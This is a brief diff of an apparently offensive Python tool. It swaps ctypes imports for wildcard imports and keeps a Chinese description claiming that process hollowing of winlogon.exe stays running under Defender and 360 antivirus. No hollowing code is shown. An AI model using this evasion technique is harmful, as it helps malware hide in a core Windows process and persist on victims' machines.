@@ -4,9 +4,8 @@ import platform
 import re
 import sys
 import subprocess
-from ctypes import FormatError, GetLastError, byref, c_size_t, create_string_buffer, sizeof, windll
-from ctypes import POINTER, Structure, Union, c_ulonglong
-from ctypes.wintypes import BOOL, BYTE, DWORD, HANDLE, LPVOID, LPWSTR, WORD
+from ctypes import *
+from ctypes.wintypes import *
 
 
 info="测试进程镂空winlogon.exe可以稳定在denfender、360等杀软防护下稳定上线，虽然defender会告警提示发现病毒木马，但并不会强制结束winlogon.exe，因此可以稳定上线使用。"
